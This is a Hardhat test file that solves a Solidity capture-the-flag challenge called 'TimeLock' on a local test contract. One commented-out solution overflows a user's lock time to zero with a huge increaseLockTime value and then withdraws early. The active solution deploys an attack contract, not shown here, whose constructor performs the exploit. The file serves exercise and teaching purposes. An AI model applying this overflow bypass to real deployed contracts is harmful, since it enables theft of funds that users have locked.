const { expect } = require('chai')
const { ethers } = require('hardhat')

// run the test
// npx hardhat test ./test/N3-TimeLock-easy.js
describe('CTF #3 TimeLock', function () {
  before(async function () {
    ;[user, alice] = await ethers.getSigners()

    const Challenge = await ethers.getContractFactory('N3TimeLock')
    challengeInstance = await Challenge.deploy()
    await challengeInstance.deployed()

    await challengeInstance.connect(alice).deposit({ value: ethers.utils.parseEther('0.0001') })
    await challengeInstance.connect(user).deposit({ value: ethers.utils.parseEther('0.0001') })
  })

  // OPTION 1: WITHOUT CONTRACT
  // it('Should recover all funds', async function () {
  //   // Your code goes here

  //   // Declare seconds to add
  //   maxTimePossible = 2 ** 256 - 1
  //   lockTime = await challengeInstance.lockTime(user.address)
  //   timeToAdd = String(BigInt(maxTimePossible) - BigInt(lockTime))

  //   // Overflow our lockTime to 0
  //   await challengeInstance.connect(user).increaseLockTime(timeToAdd)

  //   // Withdraw our funds quickly
  //   await challengeInstance.connect(user).withdraw()

  //   expect(await challengeInstance.balances(user.address)).to.equal('0')
  // })

  // OPTION 2: WITH CONTRACT
  it('Should recover all funds', async function () {
    // Your code goes here

    // Deploy evil contract with some ETH. Attack happens in the constructor.
    const N3TimeLockhack = await ethers.getContractFactory('N3TimeLockHack')
    attackerContract = await N3TimeLockhack.connect(user).deploy(challengeInstance.address, {
      value: ethers.utils.parseEther('0.0001'),
    })

    expect(await challengeInstance.balances(user.address)).to.equal('0')
  })
})
